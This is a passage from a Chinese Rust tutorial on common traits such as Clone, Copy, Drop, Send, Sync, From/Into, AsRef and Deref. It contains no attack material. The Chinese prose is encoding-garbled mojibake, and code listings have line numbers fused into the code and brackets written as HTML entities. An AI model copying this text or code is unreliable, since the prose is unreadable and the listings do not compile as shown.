(addr3, vtable3): (usize, usize) = unsafe &#123; transmute(w3) &#125;; let (addr4, vtable4): (usize, usize) = unsafe &#123; transmute(w4) &#125;; // s å’Œ s1 åœ¨æ ˆä¸Šçš„åœ°å€ï¼Œä»¥åŠ main åœ¨ TEXT æ®µçš„åœ°å€ println!( \"s1: &#123;:p&#125;, s2: &#123;:p&#125;, main(): &#123;:p&#125;\", &amp;s1, &amp;s2, main as *const () ); // trait object(s / Display) çš„ ptr åœ°å€å’Œ vtable åœ°å€ println!(\"addr1: 0x&#123;:x&#125;, vtable1: 0x&#123;:x&#125;\", addr1, vtable1); // trait object(s / Debug) çš„ ptr åœ°å€å’Œ vtable åœ°å€ println!(\"addr2: 0x&#123;:x&#125;, vtable2: 0x&#123;:x&#125;\", addr2, vtable2); // trait object(s1 / Display) çš„ ptr åœ°å€å’Œ vtable åœ°å€ println!(\"addr3: 0x&#123;:x&#125;, vtable3: 0x&#123;:x&#125;\", addr3, vtable3); // trait object(s1 / Display) çš„ ptr åœ°å€å’Œ vtable åœ°å€ println!(\"addr4: 0x&#123;:x&#125;, vtable4: 0x&#123;:x&#125;\", addr4, vtable4); // æŒ‡å‘åŒä¸€ä¸ªæ•°æ®çš„ trait object å…¶ ptr åœ°å€ç›¸åŒ assert_eq!(addr1, addr2); assert_eq!(addr3, addr4); // æŒ‡å‘åŒä¸€ç§ç±»å‹çš„åŒä¸€ä¸ª trait çš„ vtable åœ°å€ç›¸åŒ // è¿™é‡Œéƒ½æ˜¯ String + Display assert_eq!(vtable1, vtable3); // è¿™é‡Œéƒ½æ˜¯ String + Debug assert_eq!(vtable2, vtable4);&#125; ä½¿ç”¨ trait æ³¨æ„äº‹é¡¹ åœ¨å®šä¹‰å’Œä½¿ç”¨ trait æ—¶ï¼Œéœ€è¦éµå¾ªå­¤å„¿è§„åˆ™ï¼ˆOrphan Ruleï¼‰ã€‚trait å’Œå®ç° trait çš„æ•°æ®ç±»å‹ï¼Œè‡³å°‘æœ‰ä¸€ä¸ªæ˜¯åœ¨å½“å‰ crate ä¸­å®šä¹‰çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä½ ä¸èƒ½ä¸ºç¬¬ä¸‰æ–¹çš„ç±»å‹å®ç°ç¬¬ä¸‰æ–¹çš„ traitã€‚ Rust å¯¹å«æœ‰ async fn çš„ trait ï¼Œè¿˜æ²¡æœ‰ä¸€ä¸ªå¾ˆå¥½çš„è¢«æ ‡å‡†åº“æ¥å—çš„å®ç°(2019) å¸¸è§ Trait Clone / Copy traitï¼Œçº¦å®šäº†æ•°æ®è¢«æ·±æ‹·è´å’Œæµ…æ‹·è´çš„è¡Œä¸ºï¼› Read / Write traitï¼Œçº¦å®šäº†å¯¹ I/O è¯»å†™çš„è¡Œä¸ºï¼› Iteratorï¼Œçº¦å®šäº†è¿­ä»£å™¨çš„è¡Œä¸ºï¼› Debugï¼Œçº¦å®šäº†æ•°æ®å¦‚ä½•è¢«ä»¥ debug çš„æ–¹å¼æ˜¾ç¤ºå‡ºæ¥çš„è¡Œä¸ºï¼› Defaultï¼Œçº¦å®šæ•°æ®ç±»å‹çš„ç¼ºçœå€¼å¦‚ä½•äº§ç”Ÿçš„è¡Œä¸ºï¼› From / TryFromï¼Œçº¦å®šäº†æ•°æ®é—´å¦‚ä½•è½¬æ¢çš„è¡Œä¸º. å†…å­˜ç›¸å…³ï¼šClone 1234567pub trait Clone &#123; fn clone(&amp;self) -&gt; Self; fn clone_from(&amp;mut self, source: &amp;Self) &#123; *self = source.clone() &#125;&#125; åœ¨ clone è¿‡ç¨‹ä¸­ä¼šåˆ†é…å†…å­˜ï¼Œé‚£ä¹ˆç”¨ a.clone_from(&amp;b) å¯ä»¥é¿å…å†…å­˜åˆ†é…ï¼Œæé«˜æ•ˆç‡ã€‚ Clone trait å¯ä»¥é€šè¿‡æ´¾ç”Ÿå®ç›´æ¥å®ç°ï¼Œè¿™æ ·èƒ½ç®€åŒ–ä¸å°‘ä»£ç ã€‚å¦‚æœåœ¨ä½ çš„æ•°æ®ç»“æ„é‡Œï¼Œæ¯ä¸€ä¸ªå­—æ®µéƒ½å·²ç»å®ç°äº†Clone traitï¼Œä½ å¯ä»¥ç”¨ #[derive(Clone)]ã€‚ Clone æ˜¯æ·±åº¦æ‹·è´ï¼Œæ ˆå†…å­˜å’Œå †å†…å­˜ä¸€èµ·æ‹·è´ã€‚ clone æ–¹æ³•çš„æ¥å£æ˜¯ &amp;selfï¼Œè¿™åœ¨ç»å¤§å¤šæ•°åœºåˆä¸‹éƒ½æ˜¯é€‚ç”¨çš„ã€‚åœ¨ clone ä¸€ä¸ªæ•°æ®æ—¶åªéœ€è¦æœ‰å·²æœ‰æ•°æ®çš„åªè¯»å¼•ç”¨ã€‚ä½†å¯¹ Rc è¿™æ ·åœ¨ clone() æ—¶ç»´æŠ¤å¼•ç”¨è®¡æ•°çš„æ•°æ®ç»“æ„ï¼Œclone() è¿‡ç¨‹ä¸­ä¼šæ”¹å˜è‡ªå·±ï¼Œæ‰€ä»¥è¦ç”¨ Cell è¿™æ ·æä¾›å†…éƒ¨å¯å˜æ€§çš„ç»“æ„æ¥è¿›è¡Œæ”¹å˜ã€‚ å†…å­˜ç›¸å…³ï¼šCopy Copy trait æ²¡æœ‰ä»»ä½•é¢å¤–çš„æ–¹æ³•ï¼Œå®ƒåªæ˜¯ä¸€ä¸ªæ ‡è®° traitï¼ˆmarker traitï¼‰. 1pub trait Copy: Clone &#123;&#125; è™½ç„¶æ²¡æœ‰ä»»ä½•è¡Œä¸ºï¼Œä½†å®ƒå¯ä»¥ç”¨ä½œ trait bound æ¥è¿›è¡Œç±»å‹å®‰å…¨æ£€æŸ¥ï¼Œæ‰€ä»¥å«æ ‡è®° traitã€‚ å¦‚æœç±»å‹å®ç°äº† Copyï¼Œé‚£ä¹ˆåœ¨èµ‹å€¼ã€å‡½æ•°è°ƒç”¨çš„æ—¶å€™ï¼Œå€¼ä¼šè¢«æ‹·è´ï¼Œå¦åˆ™æ‰€æœ‰æƒä¼šè¢«ç§»åŠ¨ Moveã€‚ å¯å˜å¼•ç”¨ &amp;mut T æ²¡æœ‰å®ç° Copyã€‚å› ä¸ºï¼Œä¸ç¬¦åˆåŒä¸€ä¸ªä½œç”¨åŸŸä¸‹åªèƒ½æœ‰ä¸€ä¸ªå¯å˜å¼•ç”¨ çš„æ‰€æœ‰æƒè§„åˆ™ã€‚ å†…å­˜ç›¸å…³ï¼šDrop 123pub trait Drop &#123; fn drop(&amp;mut self);&#125; å¤§éƒ¨åˆ†åœºæ™¯æ— éœ€ä¸ºæ•°æ®ç»“æ„æä¾› Drop traitï¼Œç³»ç»Ÿé»˜è®¤ä¼šä¾æ¬¡å¯¹æ•°æ®ç»“æ„çš„æ¯ä¸ªåŸŸåš dropã€‚ é™¤äº†ä»¥ä¸‹ä¸¤ç§æƒ…å†µï¼š å¸Œæœ›åœ¨æ•°æ®ç»“æŸç”Ÿå‘½å‘¨æœŸçš„æ—¶å€™åšä¸€äº›äº‹æƒ…ï¼Œæ¯”å¦‚è®°æ—¥å¿—ã€‚ éœ€è¦å¯¹èµ„æºå›æ”¶çš„åœºæ™¯ã€‚æ¯”å¦‚è¯´é”èµ„æºçš„é‡Šæ”¾ï¼Œåœ¨ MutexGuard ä¸­å®ç°äº† Drop æ¥é‡Šæ”¾é”èµ„æºï¼š 123456789impl&lt;T: ?Sized&gt; Drop for MutexGuard&lt;'_, T&gt; &#123; #[inline] fn drop(&amp;mut self) &#123; unsafe &#123; self.lock.poison.done(&amp;self.poison); self.lock.inner.raw_unlock(); &#125; &#125;&#125; Copy trait å’Œ Drop trait æ˜¯äº’æ–¥çš„ï¼Œä¸¤è€…ä¸èƒ½å…±å­˜ã€‚ Copyæ˜¯æŒ‰ä½åšæµ…æ‹·è´ï¼Œé‚£ä¹ˆå®ƒä¼šé»˜è®¤æ‹·è´çš„æ•°æ®æ²¡æœ‰éœ€è¦é‡Šæ”¾çš„èµ„æºï¼›è€ŒDropæ°æ°æ˜¯ä¸ºäº†é‡Šæ”¾é¢å¤–çš„èµ„æºè€Œç”Ÿçš„ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465use std::&#123;fmt, slice&#125;;// æ³¨æ„è¿™é‡Œï¼Œå®ç°äº† Copyï¼Œè¿™æ˜¯å› ä¸º *mut u8/usize éƒ½æ”¯æŒ Copy#[derive(Clone, Copy)]struct RawBuffer &#123; // è£¸æŒ‡é’ˆç”¨ *const / *mut æ¥è¡¨è¿°ï¼Œè¿™å’Œå¼•ç”¨çš„ &amp; ä¸åŒ ptr: *mut u8, len: usize,&#125;impl From&lt;Vec&lt;u8&gt;&gt; for RawBuffer &#123; fn from(vec: Vec&lt;u8&gt;) -&gt; Self &#123; let slice = vec.into_boxed_slice(); Self &#123; len: slice.len(), // into_raw ä¹‹åï¼ŒBox å°±ä¸ç®¡è¿™å—å†…å­˜çš„é‡Šæ”¾äº†ï¼ŒRawBuffer éœ€è¦å¤„ç†é‡Šæ”¾ ptr: Box::into_raw(slice) as *mut u8, &#125; &#125;&#125;// å¦‚æœ RawBuffer å®ç°äº† Drop traitï¼Œå°±å¯ä»¥åœ¨æ‰€æœ‰è€…é€€å‡ºæ—¶é‡Šæ”¾å †å†…å­˜// ç„¶åï¼ŒDrop trait ä¼šè·Ÿ Copy trait å†²çªï¼Œè¦ä¹ˆä¸å®ç° Copyï¼Œè¦ä¹ˆä¸å®ç° Drop// å¦‚æœä¸å®ç° Dropï¼Œé‚£ä¹ˆå°±ä¼šå¯¼è‡´å†…å­˜æ³„æ¼ï¼Œä½†å®ƒä¸ä¼šå¯¹æ­£ç¡®æ€§æœ‰ä»»ä½•ç ´å// æ¯”å¦‚ä¸ä¼šå‡ºç° use after free è¿™æ ·çš„é—®é¢˜ã€‚// ä½ å¯ä»¥è¯•ç€æŠŠä¸‹é¢æ³¨é‡Šå»æ‰ï¼Œçœ‹çœ‹ä¼šå‡ºä»€ä¹ˆé—®é¢˜// impl Drop for RawBuffer &#123;// #[inline]// fn drop(&amp;mut self) &#123;// let data = unsafe &#123; Box::from_raw(slice::from_raw_parts_mut(self.ptr, self.len)) &#125;;// drop(data)// &#125;// &#125;impl fmt::Debug for RawBuffer &#123; fn fmt(&amp;self, f: &amp;mut fmt::Formatter&lt;'_&gt;) -&gt; fmt::Result &#123; let data = self.as_ref(); write!(f, \"&#123;:p&#125;: &#123;:?&#125;\", self.ptr, data) &#125;&#125;impl AsRef&lt;[u8]&gt; for RawBuffer &#123; fn as_ref(&amp;self) -&gt; &amp;[u8] &#123; unsafe &#123; slice::from_raw_parts(self.ptr, self.len) &#125; &#125;&#125;fn main() &#123; let data = vec![1, 2, 3, 4]; let buf: RawBuffer = data.into(); // å› ä¸º buf å…è®¸ Copyï¼Œæ‰€ä»¥è¿™é‡Œ Copy äº†ä¸€ä»½ use_buffer(buf); // buf è¿˜èƒ½ç”¨ println!(\"buf: &#123;:?&#125;\", buf);&#125;fn use_buffer(buf: RawBuffer) &#123; println!(\"buf to die: &#123;:?&#125;\", buf); // è¿™é‡Œä¸ç”¨ç‰¹æ„ dropï¼Œå†™å‡ºæ¥åªæ˜¯ä¸ºäº†è¯´æ˜ Copy å‡ºæ¥çš„ buf è¢« Drop äº† drop(buf)&#125; å¯¹äºä»£ç å®‰å…¨æ¥è¯´ï¼Œå†…å­˜æ³„æ¼å±å®³å¤§ï¼Ÿè¿˜æ˜¯ use after free å±å®³å¤§å‘¢ï¼Ÿè‚¯å®šæ˜¯åè€…ã€‚Rust çš„åº•çº¿æ˜¯å†…å­˜å®‰å…¨ï¼Œæ‰€ä»¥ä¸¤å®³ç›¸æƒå–å…¶è½»ã€‚ æ— æ³•ä¿è¯ä¸å‘ç”Ÿäººä¸ºçš„å†…å­˜æ³„æ¼ï¼Œæ¯”å¦‚ç¨‹åºåœ¨è¿è¡Œæ—¶ï¼Œå¯¹å“ˆå¸Œè¡¨åªæ·»åŠ ä¸åˆ é™¤ï¼Œå°±ä¼šé€ æˆå†…å­˜æ³„æ¼ã€‚ æ ‡è®°ç›¸å…³ï¼šSized Sized trait ç”¨äºæ ‡è®°æœ‰å…·ä½“å¤§å°çš„ç±»å‹ã€‚åœ¨ä½¿ç”¨æ³›å‹å‚æ•°æ—¶ï¼ŒRust ç¼–è¯‘å™¨ä¼šè‡ªåŠ¨ä¸ºæ³›å‹å‚æ•°åŠ ä¸Š Sized çº¦æŸï¼Œæ¯”å¦‚ä¸‹é¢çš„ Data å’Œå¤„ç† Data çš„å‡½æ•° process_dataï¼š 1234567struct Data&lt;T&gt; &#123; inner: T,&#125;fn process_data&lt;T&gt;(data: Data&lt;T&gt;) &#123; todo!();&#125; å®ƒç­‰ä»·äºï¼š 1234567struct Data&lt;T: Sized&gt; &#123; inner: T,&#125;fn process_data&lt;T: Sized&gt;(data: Data&lt;T&gt;) &#123; todo!();&#125; åœ¨å°‘æ•°æƒ…å†µä¸‹ï¼Œéœ€è¦ T æ˜¯å¯å˜ç±»å‹çš„ï¼ŒRust æä¾›äº† ?Sized æ¥æ‘†è„±è¿™ä¸ªçº¦æŸã€‚ 1234567pub enum Cow&lt;'a, B: ?Sized + 'a&gt; where B: ToOwned,&#123; // å€Ÿç”¨çš„æ•°æ® Borrowed(&amp;'a B), // æ‹¥æœ‰çš„æ•°æ® Owned(&lt;B as ToOwned&gt;::Owned),&#125; è¿™æ · B å°±å¯ä»¥æ˜¯ [T] æˆ–è€… str ç±»å‹ï¼Œå¤§å°éƒ½æ˜¯ä¸å›ºå®šçš„ã€‚è¦æ³¨æ„ Borrowed(&amp;'a B) å¤§å°æ˜¯å›ºå®šçš„ï¼Œå› ä¸ºå®ƒå†…éƒ¨æ˜¯å¯¹ B çš„ä¸€ä¸ªå¼•ç”¨ï¼Œè€Œå¼•ç”¨çš„å¤§å°æ˜¯å›ºå®šçš„ã€‚ æ ‡è®°ç›¸å…³ï¼šSend/Sync è¯´å®Œäº† Sizedï¼Œå†æ¥çœ‹ Send / Syncï¼Œå®šä¹‰æ˜¯ï¼š 12pub unsafe auto trait Send &#123;&#125;pub unsafe auto trait Sync &#123;&#125; è¿™ä¸¤ä¸ª trait éƒ½æ˜¯ unsafe auto traitï¼Œauto æ„å‘³ç€ç¼–è¯‘å™¨ä¼šåœ¨åˆé€‚çš„åœºåˆï¼Œè‡ªåŠ¨ä¸ºæ•°æ®ç»“æ„æ·»åŠ å®ƒä»¬çš„å®ç°ï¼Œè€Œ unsafe ä»£è¡¨å®ç°çš„è¿™ä¸ª trait å¯èƒ½ä¼šè¿èƒŒ Rust çš„å†…å­˜å®‰å…¨å‡†åˆ™ï¼Œå¦‚æœå¼€å‘è€…æ‰‹å·¥å®ç°è¿™ä¸¤ä¸ª trait ï¼Œè¦è‡ªå·±ä¸ºå®ƒä»¬çš„å®‰å…¨æ€§è´Ÿè´£ã€‚ Send/Sync æ˜¯ Rust å¹¶å‘å®‰å…¨çš„åŸºç¡€ï¼š å¦‚æœä¸€ä¸ªç±»å‹ T å®ç°äº† Send traitï¼Œæ„å‘³ç€ T å¯ä»¥å®‰å…¨åœ°ä»ä¸€ä¸ªçº¿ç¨‹ç§»åŠ¨åˆ°å¦ä¸€ä¸ªçº¿ç¨‹ï¼Œä¹Ÿå°±æ˜¯è¯´æ‰€æœ‰æƒå¯ä»¥åœ¨çº¿ç¨‹é—´ç§»åŠ¨ã€‚ å¦‚æœä¸€ä¸ªç±»å‹ T å®ç°äº† Sync traitï¼Œåˆ™æ„å‘³ç€ &amp;T å¯ä»¥å®‰å…¨åœ°åœ¨å¤šä¸ªçº¿ç¨‹ä¸­å…±äº«ã€‚ä¸€ä¸ªç±»å‹ T æ»¡è¶³ Sync traitï¼Œå½“ä¸”ä»…å½“ &amp;T æ»¡è¶³ Send traitã€‚ å¦‚æœä¸€ä¸ªç±»å‹T: Sendï¼Œé‚£ä¹ˆ T åœ¨æŸä¸ªçº¿ç¨‹ä¸­çš„ç‹¬å è®¿é—®æ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼›å¦‚æœä¸€ä¸ªç±»å‹ T: Syncï¼Œé‚£ä¹ˆ T åœ¨çº¿ç¨‹é—´çš„åªè¯»å…±äº«æ˜¯å®‰å…¨çš„ã€‚ å®šä¹‰çš„æ•°æ®ç»“æ„ï¼Œå¦‚æœå…¶å†…éƒ¨çš„æ‰€æœ‰åŸŸéƒ½å®ç°äº† Send / Syncï¼Œé‚£ä¹ˆè¿™ä¸ªæ•°æ®ç»“æ„ä¼šè¢«è‡ªåŠ¨æ·»åŠ  Send / Sync ã€‚åŸºæœ¬ä¸ŠåŸç”Ÿæ•°æ®ç»“æ„éƒ½æ”¯æŒ Send / Syncï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œç»å¤§å¤šæ•°è‡ªå®šä¹‰çš„æ•°æ®ç»“æ„éƒ½æ˜¯æ»¡è¶³ Send / Sync çš„ã€‚æ ‡å‡†åº“ä¸­ï¼Œä¸æ”¯æŒ Send / Sync çš„æ•°æ®ç»“æ„ä¸»è¦æœ‰ï¼š è£¸æŒ‡é’ˆ const T / mut Tã€‚å®ƒä»¬æ˜¯ä¸å®‰å…¨çš„ï¼Œæ‰€ä»¥æ—¢ä¸æ˜¯ Send ä¹Ÿä¸æ˜¯ Syncã€‚ UnsafeCell ä¸æ”¯æŒ Syncã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä»»ä½•ä½¿ç”¨äº† Cell æˆ–è€… RefCell çš„æ•°æ®ç»“æ„ä¸æ”¯æŒ Syncã€‚ å¼•ç”¨è®¡æ•° Rc ä¸æ”¯æŒ Send ä¹Ÿä¸æ”¯æŒ Syncã€‚æ‰€ä»¥ Rc æ— æ³•è·¨çº¿ç¨‹ã€‚ å¦‚æœå°è¯•è·¨çº¿ç¨‹ä½¿ç”¨ Rc / RefCellï¼Œä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ 12345pub fn spawn&lt;F, T&gt;(f: F) -&gt; JoinHandle&lt;T&gt; where F: FnOnce() -&gt; T, F: Send + 'static, T: Send + 'static, 'static æ„æ€æ˜¯é—­åŒ…æ•è·çš„è‡ªç”±å˜é‡å¿…é¡»æ˜¯ä¸€ä¸ªæ‹¥æœ‰æ‰€æœ‰æƒçš„ç±»å‹ï¼Œæˆ–è€…æ˜¯ä¸€ä¸ªæ‹¥æœ‰é™æ€ç”Ÿå‘½å‘¨æœŸçš„å¼•ç”¨ï¼› Send æ„æ€æ˜¯ï¼Œè¿™äº›è¢«æ•è·è‡ªç”±å˜é‡çš„æ‰€æœ‰æƒå¯ä»¥ä»ä¸€ä¸ªçº¿ç¨‹ç§»åŠ¨åˆ°å¦ä¸€ä¸ªçº¿ç¨‹ã€‚ å¦‚æœåœ¨çº¿ç¨‹é—´ä¼ é€’ Rcï¼Œæ˜¯æ— æ³•ç¼–è¯‘é€šè¿‡çš„ï¼Œå› ä¸º Rc çš„å®ç°ä¸æ”¯æŒ Send å’Œ Syncã€‚ Arc å†…éƒ¨çš„æ•°æ®æ˜¯å…±äº«çš„ï¼Œéœ€è¦æ”¯æŒ Sync çš„æ•°æ®ç»“æ„ï¼Œä½†æ˜¯RefCell ä¸æ˜¯ Syncã€‚ æ ‡è®°ç›¸å…³ï¼šUnpin ç±»å‹è½¬æ¢ï¼šFrom 1234567891011// ç¬¬ä¸€ç§æ–¹æ³•ï¼Œä¸ºæ¯ä¸€ç§è½¬æ¢æä¾›ä¸€ä¸ªæ–¹æ³•// æŠŠå­—ç¬¦ä¸² s è½¬æ¢æˆ Pathlet v = s.to_path();// æŠŠå­—ç¬¦ä¸² s è½¬æ¢æˆ u64let v = s.to_u64();// ç¬¬äºŒç§æ–¹æ³•ï¼Œä¸º s å’Œè¦è½¬æ¢çš„ç±»å‹ä¹‹é—´å®ç°ä¸€ä¸ª Into&lt;T&gt; trait// v çš„ç±»å‹æ ¹æ®ä¸Šä¸‹æ–‡å¾—å‡ºlet v = s.into();// æˆ–è€…ä¹Ÿå¯ä»¥æ˜¾å¼åœ°æ ‡æ³¨ v çš„ç±»å‹let v: u64 = s.into(); ç¬¬ä¸€ç§æ–¹å¼ï¼Œåœ¨ç±»å‹ T çš„å®ç°é‡Œï¼Œè¦ä¸ºæ¯ä¸€ç§å¯èƒ½çš„è½¬æ¢æä¾›ä¸€ä¸ªæ–¹æ³•ï¼›ç¬¬äºŒç§ï¼Œä¸ºç±»å‹ T å’Œç±»å‹ U ä¹‹é—´çš„è½¬æ¢å®ç°ä¸€ä¸ªæ•°æ®è½¬æ¢ traitï¼Œè¿™æ ·å¯ä»¥ç”¨åŒä¸€ä¸ªæ–¹æ³•æ¥å®ç°ä¸åŒçš„è½¬æ¢ã€‚ æ˜¾ç„¶ï¼Œç¬¬äºŒç§æ–¹æ³•è¦æ›´å¥½ï¼Œå› ä¸ºå®ƒç¬¦åˆè½¯ä»¶å¼€å‘çš„å¼€é—­åŸåˆ™ï¼ˆOpen-Close Principleï¼‰ï¼Œâ€œè½¯ä»¶ä¸­çš„å¯¹è±¡ï¼ˆç±»ã€æ¨¡å—ã€å‡½æ•°ç­‰ç­‰ï¼‰å¯¹æ‰©å±•æ˜¯å¼€æ”¾çš„ï¼Œä½†æ˜¯å¯¹ä¿®æ”¹æ˜¯å°é—­çš„â€ã€‚ Rust æä¾›äº†ä¸¤å¥—ä¸åŒçš„ traitï¼š å€¼ç±»å‹åˆ°å€¼ç±»å‹çš„è½¬æ¢ï¼šFrom / Into / TryFrom / TryInto å¼•ç”¨ç±»å‹åˆ°å¼•ç”¨ç±»å‹çš„è½¬æ¢ï¼šAsRef / AsMut å…ˆçœ‹ From å’Œ Intoã€‚è¿™ä¸¤ä¸ª trait çš„å®šä¹‰å¦‚ä¸‹ï¼š 1234567pub trait From&lt;T&gt; &#123; fn from(T) -&gt; Self;&#125;pub trait Into&lt;T&gt; &#123; fn into(self) -&gt; T;&#125; åœ¨å®ç° From çš„æ—¶å€™ä¼šè‡ªåŠ¨å®ç° Intoã€‚è¿™æ˜¯å› ä¸ºï¼š 123456// å®ç° From ä¼šè‡ªåŠ¨å®ç° Intoimpl&lt;T, U&gt; Into&lt;U&gt; for T where U: From&lt;T&gt; &#123; fn into(self) -&gt; U &#123; U::from(self) &#125;&#125; æ‰€ä»¥å¤§éƒ¨åˆ†æƒ…å†µä¸‹ï¼Œåªç”¨å®ç° Fromï¼Œç„¶åè¿™ä¸¤ç§æ–¹å¼éƒ½èƒ½åšæ•°æ®è½¬æ¢ï¼Œæ¯”å¦‚ï¼š 12let s = String::from(\"Hello world!\");let s: String = \"Hello world!\".into(); è¿™ä¸¤ç§æ–¹å¼æ˜¯ç­‰ä»·çš„ï¼Œæ€ä¹ˆé€‰å‘¢ï¼ŸFrom å¯ä»¥æ ¹æ®ä¸Šä¸‹æ–‡åšç±»å‹æ¨å¯¼ï¼Œä½¿ç”¨åœºæ™¯æ›´å¤šï¼›è€Œä¸”å› ä¸ºå®ç°äº† From ä¼šè‡ªåŠ¨å®ç° Intoï¼Œåä¹‹ä¸ä¼šã€‚æ‰€ä»¥éœ€è¦çš„æ—¶å€™ï¼Œä¸è¦å»å®ç° Intoï¼Œåªè¦å®ç° From å°±å¥½äº†ã€‚ æ­¤å¤–ï¼ŒFrom å’Œ Into è¿˜æ˜¯è‡ªåçš„ï¼šæŠŠç±»å‹ T çš„å€¼è½¬æ¢æˆç±»å‹ Tï¼Œä¼šç›´æ¥è¿”å›ã€‚è¿™æ˜¯å› ä¸ºæ ‡å‡†åº“æœ‰å¦‚ä¸‹çš„å®ç°ï¼š 123456// Fromï¼ˆä»¥åŠ Intoï¼‰æ˜¯è‡ªåçš„impl&lt;T&gt; From&lt;T&gt; for T &#123; fn from(t: T) -&gt; T &#123; t &#125;&#125; æœ‰äº† From å’Œ Intoï¼Œå¾ˆå¤šå‡½æ•°çš„æ¥å£å°±å¯ä»¥å˜å¾—çµæ´»ï¼Œæ¯”å¦‚å‡½æ•°å¦‚æœæ¥å—ä¸€ä¸ª IpAddr ä¸ºå‚æ•°ï¼Œå¯ä»¥ä½¿ç”¨ Into è®©æ›´å¤šçš„ç±»å‹å¯ä»¥è¢«è¿™ä¸ªå‡½æ•°ä½¿ç”¨ï¼Œçœ‹ä¸‹é¢çš„ä»£ç ï¼š 12345678910111213141516171819use std::net::&#123;IpAddr, Ipv4Addr, Ipv6Addr&#125;;fn print(v: impl Into&lt;IpAddr&gt;) &#123; println!(\"&#123;:?&#125;\", v.into());&#125;fn main() &#123; let v4: Ipv4Addr = \"2.2.2.2\".parse().unwrap(); let v6: Ipv6Addr = \"::1\".parse().unwrap(); // IPAddr å®ç°äº† From&lt;[u8; 4]ï¼Œè½¬æ¢ IPv4 åœ°å€ print([1, 1, 1, 1]); // IPAddr å®ç°äº† From&lt;[u16; 8]ï¼Œè½¬æ¢ IPv6 åœ°å€ print([0xfe80, 0, 0, 0, 0xaede, 0x48ff, 0xfe00, 0x1122]); // IPAddr å®ç°äº† From&lt;Ipv4Addr&gt; print(v4); // IPAddr å®ç°äº† From&lt;Ipv6Addr&gt; print(v6);&#125; æ‰€ä»¥ï¼Œåˆç†åœ°ä½¿ç”¨ From / Intoï¼Œå¯ä»¥è®©ä»£ç å˜å¾—ç®€æ´ï¼Œç¬¦åˆ Rust å¯è¯»æ€§å¼ºçš„é£æ ¼ï¼Œæ›´ç¬¦åˆå¼€é—­åŸåˆ™ã€‚ å¦‚æœä½ çš„æ•°æ®ç±»å‹åœ¨è½¬æ¢è¿‡ç¨‹ä¸­æœ‰å¯èƒ½å‡ºç°é”™è¯¯ï¼Œå¯ä»¥ä½¿ç”¨ TryFrom å’Œ TryIntoï¼Œå®ƒä»¬çš„ç”¨æ³•å’Œ From / Into ä¸€æ ·ï¼Œåªæ˜¯ trait å†…å¤šäº†ä¸€ä¸ªå…³è”ç±»å‹ Errorï¼Œä¸”è¿”å›çš„ç»“æœæ˜¯ Result&lt;T, Self::Error&gt;ã€‚ ç±»å‹è½¬æ¢ï¼šAsRef / AsMut 1234567pub trait AsRef&lt;T&gt; where T: ?Sized &#123; fn as_ref(&amp;self) -&gt; &amp;T;&#125;pub trait AsMut&lt;T&gt; where T: ?Sized &#123; fn as_mut(&amp;mut self) -&gt; &amp;mut T;&#125; åœ¨ trait çš„å®šä¹‰ä¸Šï¼Œéƒ½å…è®¸ T ä½¿ç”¨å¤§å°å¯å˜çš„ç±»å‹ï¼Œå¦‚ strã€[u8] ç­‰ã€‚AsMut é™¤äº†ä½¿ç”¨å¯å˜å¼•ç”¨ç”Ÿæˆå¯å˜å¼•ç”¨å¤–ï¼Œå…¶å®ƒéƒ½å’Œ AsRef ä¸€æ ·ã€‚ çœ‹æ ‡å‡†åº“ä¸­æ‰“å¼€æ–‡ä»¶çš„æ¥å£ std::fs::File::openï¼š 1pub fn open&lt;P: AsRef&lt;Path&gt;&gt;(path: P) -&gt; Result&lt;File&gt; å®ƒçš„å‚æ•° path æ˜¯ç¬¦åˆ AsRef çš„ç±»å‹ï¼Œæ‰€ä»¥ï¼Œä½ å¯ä»¥ä¸ºè¿™ä¸ªå‚æ•°ä¼ å…¥ Stringã€&amp;strã€PathBufã€Path ç­‰ç±»å‹ã€‚è€Œä¸”ï¼Œå½“ä½ ä½¿ç”¨ path.as_ref() æ—¶ï¼Œä¼šå¾—åˆ°ä¸€ä¸ª &amp;Pathã€‚ 1234567891011121314151617181920212223242526272829303132#[allow(dead_code)]enum Language &#123; Rust, TypeScript, Elixir, Haskell,&#125;impl AsRef&lt;str&gt; for Language &#123; fn as_ref(&amp;self) -&gt; &amp;str &#123; match self &#123; Language::Rust =&gt; \"Rust\", Language::TypeScript =&gt; \"TypeScript\", Language::Elixir =&gt; \"Elixir\", Language::Haskell =&gt; \"Haskell\", &#125; &#125;&#125;fn print_ref(v: impl AsRef&lt;str&gt;) &#123; println!(\"&#123;&#125;\", v.as_ref());&#125;fn main() &#123; let lang = Language::Rust; // &amp;str å®ç°äº† AsRef&lt;str&gt; print_ref(\"Hello world!\"); // String å®ç°äº† AsRef&lt;str&gt; print_ref(\"Hello world!\".to_string()); // è‡ªå·±å®šä¹‰çš„ enum ä¹Ÿå®ç°äº† AsRef&lt;str&gt; print_ref(lang);&#125; å¦‚æœä½ çš„ä»£ç å‡ºç° v.as_ref().clone() è¿™æ ·çš„è¯­å¥ï¼Œä¹Ÿå°±æ˜¯è¯´ä½ è¦å¯¹ v è¿›è¡Œå¼•ç”¨è½¬æ¢ï¼Œç„¶ååˆå¾—åˆ°äº†æ‹¥æœ‰æ‰€æœ‰æƒçš„å€¼ï¼Œé‚£ä¹ˆä½ åº”è¯¥å®ç° Fromï¼Œç„¶ååš v.into()ã€‚ æ“ä½œç¬¦ç›¸å…³ï¼šDeref/DerefMut 123456789pub trait Deref &#123; // è§£å¼•ç”¨å‡ºæ¥çš„ç»“æœç±»å‹ type Target: ?Sized; fn deref(&amp;self) -&gt; &amp;Self::Target;&#125;pub trait DerefMut: Deref &#123; fn deref_mut(&amp;mut self) -&gt; &amp;mut Self::Target;&#125; å¯ä»¥çœ‹åˆ°ï¼ŒDerefMut â€œç»§æ‰¿â€äº† Derefï¼Œåªæ˜¯å®ƒé¢å¤–æä¾›äº†ä¸€ä¸ª deref_mut æ–¹æ³•ï¼Œç”¨æ¥è·å–å¯å˜çš„è§£å¼•ç”¨ã€‚ Deref å’Œ DerefMut æ˜¯è‡ªåŠ¨è°ƒç”¨çš„ï¼Œb ä¼šè¢«å±•å¼€ä¸º (b.deref()) åœ¨ Rust é‡Œï¼Œç»å¤§å¤šæ•°æ™ºèƒ½æŒ‡é’ˆéƒ½å®ç°äº† 